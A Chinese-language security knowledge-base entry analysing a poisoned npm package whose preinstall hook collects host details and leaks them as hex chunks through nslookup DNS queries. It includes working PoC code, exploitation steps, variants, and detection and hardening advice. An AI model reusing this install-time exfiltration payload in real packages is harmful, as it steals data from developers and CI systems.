---
id: cloud-cicd-npm-dns-chunk-exfil-hostinfo
title: NPM 投毒包 preinstall 收集主机信息并通过 DNS 分块外传（xxd + nslookup）
type: scenario
domain: cloud
path: cloud/ci-cd
technique: npm-preinstall-dns-chunk-exfil
tags:
- npm
- supply-chain
- preinstall
- dns-exfil
- exfiltration
- windows
- linux
- initial-access
cve: []
severity: medium
affected_versions: identity-auth [7.999.0,7.999.0]||[8.999.0,8.999.0]||[9.999.0,9.999.0]||[10.999.0,10.999.0]（恶意包版本）
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V515
  verified_at: '2026-11-11T11:38:46+08:00'
  notes: 已对照原文及图22/23核对：preinstall=node index.js，exec 命令 hostname/pwd/whoami/ifconfig.me 采集、xxd -p 按行分块、nslookup <chunk>.m4rwxmtkqz5wk2d1gfpk7fcqhhn8byzn.oastify.com 外带，均一致；affected_versions identity-auth 4 个 7-10.999.0 版本取自原文 db.json；dedup 候选仅 related（preinstall 蠕虫、postinstall RAT 等），非同链。PoC 未复现。
url: /docs/cloud/ci-cd/cloud-cicd-npm-dns-chunk-exfil-hostinfo/
draft: false
kb_aliases:
- DNS 外传主机信息
- nslookup 分块外带
- preinstall 信息窃取
- identity-auth 投毒
- xxd hex DNS exfil
---

## 一句话结论

恶意 NPM 包把 `preinstall` 指向 `index.js`，安装时用 `child_process.exec` 执行一条 shell：先收集主机名、工作目录、用户名与外网 IP，再用 `xxd -p` 转成十六进制、按行分块，逐块拼成 `<chunk>.<attacker-domain>` 调用 `nslookup`；攻击者只需读取自己的 DNS 查询日志，就能按顺序还原受害主机的敏感信息，全程不建立任何 HTTP C2 连接。

## 原理

- **安装期自动执行**：`package.json` 的 `scripts.preinstall = "node index.js"` 会在 npm 解析/安装该包时自动运行，不需要业务代码 `require`，也不需要显式调用任何导出函数。
- **信息收集**：`exec` 内的命令为 `a=$(hostname;pwd;whoami;echo 'identity-auth';curl https://ifconfig.me;)`——采集主机名、当前工作目录、用户名与外网出口 IP，并附带一个包标识串用于在 DNS 日志中区分投毒活动。
- **十六进制编码与分块**：`echo $a | xxd -p` 把整段信息转成十六进制字符串（只含 0-9a-f，天然满足 DNS 标签字符集）；`head` + `while read ut` 按行切分，每块控制在 DNS 单个标签允许的长度内（实际每行约 60 个字符）。
- **DNS 外带**：`nslookup $ut.<attacker-domain>` 把每块数据作为子域名发起 DNS 查询。DNS 查询通常被防火墙/代理放行，不需要出站 TCP 端口；数据藏在递归解析器转发的子域名里，攻击者的权威 DNS 服务器记录所有查询，因而能离线还原。
- **为什么隐蔽**：主机侧看不到明显的 HTTP POST/长连接；恶意代码没有文件落盘（在 shell 管道中完成）；`nslookup` 是系统常见命令，白名单场景多；DNS 标签大小写/顺序记录在服务器端，攻击者按查询时间排序即可恢复原始字节流。
- **接收端**：原文使用 `*.oastify.com` 这类带外检测域名接收查询，攻击者也可用自建权威 DNS 服务器或泛解析域名。

## 触发条件

- 开发者/CI 误装该恶意包，npm 未使用 `--ignore-scripts`（preinstall 在安装期默认执行）。
- 主机具备 `xxd`、`nslookup`、`curl`（Linux/macOS 常见组合；Windows 上亦有对应命令变体）。
- 主机允许出站 DNS 解析，且攻击者域名可被解析到其控制的权威服务器。

## 利用步骤

1. 在 NPM 发布恶意包，`package.json` 写 `"scripts": { "preinstall": "node index.js" }`。
2. `index.js` 用 `exec` 执行收集命令：`a=$(hostname;pwd;whoami;curl https://ifconfig.me;)`，并追加活动标识。
3. `echo $a | xxd -p | head | while read ut; do nslookup $ut.<attacker-domain>; done` 把数据分块经 DNS 查询发出。
4. 攻击者在权威 DNS 服务器日志中按时间顺序收集 `<chunk>` 子域，按出现顺序拼接十六进制串。
5. `xxd -r -p` 还原出主机名、路径、用户名与外网 IP，用于后续针对性攻击（弱口令、横向、社工）。

## PoC

恶意 `index.js`（结构示意，域名用占位）：

```javascript
const { exec } = require("child_process");
exec(
  "a=$(hostname;pwd;whoami;echo 'identity-auth';curl https://ifconfig.me;) && " +
  "echo $a | xxd -p | head | while read ut; do " +
  "nslookup $ut.<attacker-domain>; done",
  (error, data) => { if (error) console.log(error.message); else console.log(data); }
);
```

攻击者侧还原（在 DNS 日志中提取子域名前缀）：

```bash
# 假设日志中按查询时间得到若干 <hexchunk>.<attacker-domain>
cat dns_queries.log | grep -o '^[0-9a-f]\+' | tr -d '\n' | xxd -r -p
# 输出示例：hostname 路径 用户名 外网IP
```

## 变体与关联

- 变体：编码可换成 Base64（DNS 标签需 URL-safe 或拆分）、十六进制、自定义字符映射；传输可换 `dig`/`host`/PowerShell `Resolve-DnsName`。
- 变体：DNS 外带也可用于接收命令/配置（DNS 隧道 C2），实现双向低带宽控制。
- 关联：[[cloud-cicd-npm-postinstall-supply-chain-poisoning]]（npm 安装期执行的另一种载荷，RAT 投放）、[[cloud-cicd-npm-typosquat-install-powershell-reverse-shell]]（安装期反向 shell 载荷）。
- 边界：`npm install --ignore-scripts` 阻断；DNS 被强制走内网解析器且禁止外部查询、或对异常长子域名/高频查询做监控时可发现。

## 检测与防御

- 检测：安装期 `node` 进程拉起 `xxd`、`nslookup` 循环；DNS 查询中出现大量长十六进制子域名指向新注册/不收信域名；同一域名短时间高频 TXT/A 查询。
- 检测：npm 包 `preinstall`/`postinstall` 指向的脚本含 `child_process.exec`、`nslookup`、`xxd`、`ifconfig.me` 等组合。
- 加固：CI 使用 `npm ci --ignore-scripts`；依赖白名单与 lockfile/hash 校验；出口 DNS 只允许可信解析器并记录日志，对数据外带特征做告警。
- 响应：卸载恶意包、封禁域名、检查主机凭据是否需轮换。
